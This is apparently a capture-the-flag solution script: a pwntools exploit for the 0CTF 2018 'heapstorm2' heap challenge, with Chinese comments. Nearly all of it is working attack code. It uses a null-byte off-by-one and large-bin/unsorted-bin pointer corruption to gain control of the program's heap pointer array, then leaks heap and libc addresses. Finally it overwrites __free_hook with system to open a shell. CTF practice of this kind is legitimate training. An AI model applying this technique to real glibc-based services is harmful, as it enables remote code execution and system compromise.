#coding:utf8
from pwn import *

sh = process('./0ctf_2018_heapstorm2')
#sh = remote('node3.buuoj.cn',26323)
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
malloc_hook_s = libc.sym['__malloc_hook']
free_hook_s = libc.sym['__free_hook']
system_s = libc.sym['system']
binsh_s = libc.search('/bin/sh').next()

def add(size):
   sh.sendlineafter('Command:','1')
   sh.sendlineafter('Size:',str(size))

def edit(index,size,content):
   sh.sendlineafter('Command:','2')
   sh.sendlineafter('Index:',str(index))
   sh.sendlineafter('Size:',str(size))
   sh.sendafter('Content:',content)

def delete(index):
   sh.sendlineafter('Command:','3')
   sh.sendlineafter('Index:',str(index))

def show(index):
   sh.sendlineafter('Command:','4')
   sh.sendlineafter('Index:',str(index))

add(0x18) #0
add(0x410) #1
add(0x80) #2
add(0x18) #3
add(0x420) #4
add(0x80) #5
add(0x10) #6

#伪造chunk 1的尾部
edit(1,0x400,'b'*0x3F0 + p64(0x400) + p64(0x21))
#1放入unsorted bin
delete(1)
#null off by one shrink unsorted bin
edit(0,0x18-0xC,'a'*(0x18-0xC))
#从unsorted bin里切割
add(0x80) #1
add(0x360) #7
#1放入unsorted bin
delete(1)
#2向前合并
delete(2)
add(0x80) #1 将unsorted bin指针移动到下一个chunk
#将0x420的chunk申请出来，待会儿再放入large bin
add(0x410) #2
#我们用同样的方法来构造一个大一些的large bin
edit(4,0x400,'d'*0x3F0 + p64(0x400) + p64(0x31))
#4放入unsorted bin
delete(4)
#null off by one shrink unsorted bin
edit(3,0x18-0xC,'c'*(0x18-0xC))
#从unsorted bin里切割
add(0x80) #4
add(0x360) #8
#4放入unsorted bin
delete(4)
#5向前合并
delete(5)
add(0x80) #4
#将0x430的chunk申请出来，待会儿再放入unsorted bin
add(0x420) #5
#将2放入large bin，通过7我们可以large bin
delete(2)
add(0x500) #2
#5放入unsorted bin，通过8，我们可以控制一个未归位的large bin
delete(5)
#我们要分配到的目的地
fake_chunk = 0x0000000013370800 - 0x10
#控制unsorted bin相关指针
edit(8,0x10,p64(0) + p64(fake_chunk))
#控制large bin相关指针
edit(7,0x20,p64(0) + p64(fake_chunk + 0x8) + p64(0) + p64(fake_chunk - 0x18 -0x5))
add(0x48) #5
#通过5，我们可以控制整个堆指针数组了
edit(5,0x30,p64(0)*2 + p64(0x13377331) + p64(0) + p64(fake_chunk + 0x40) + p64(0x48))

edit(0,0x10,p64(0x00000000133707F3) + p64(0x8))
#泄露堆地址
show(1)
sh.recvuntil('Chunk[1]: ')
heap_addr = u64(sh.recv(6).ljust(8,'\x00'))
print 'heap_addr=',hex(heap_addr)
#泄露lib指针
edit(0,0x10,p64(heap_addr + 0x10) + p64(0x8))
show(1)
sh.recvuntil('Chunk[1]: ')
main_arena_88 = u64(sh.recv(6).ljust(8,'\x00'))
malloc_hook_addr = (main_arena_88 & 0xFFFFFFFFFFFFF000) + (malloc_hook_s & 0xFFF)
libc_base = malloc_hook_addr - malloc_hook_s
free_hook_addr = libc_base + free_hook_s
system_addr = libc_base + system_s
binsh_addr = libc_base + binsh_s
print 'libc_base=',hex(libc_base)
print 'free_hook_addr=',hex(free_hook_addr)
print 'system_addr=',hex(system_addr)
print 'binsh_addr=',hex(binsh_addr)
edit(0,0x10,p64(free_hook_addr) + p64(0x8))
#写free_hook
edit(1,0x8,p64(system_addr))
edit(0,0x10,p64(binsh_addr) + p64(0x8))
#getshell
delete(1)

sh.interactive()
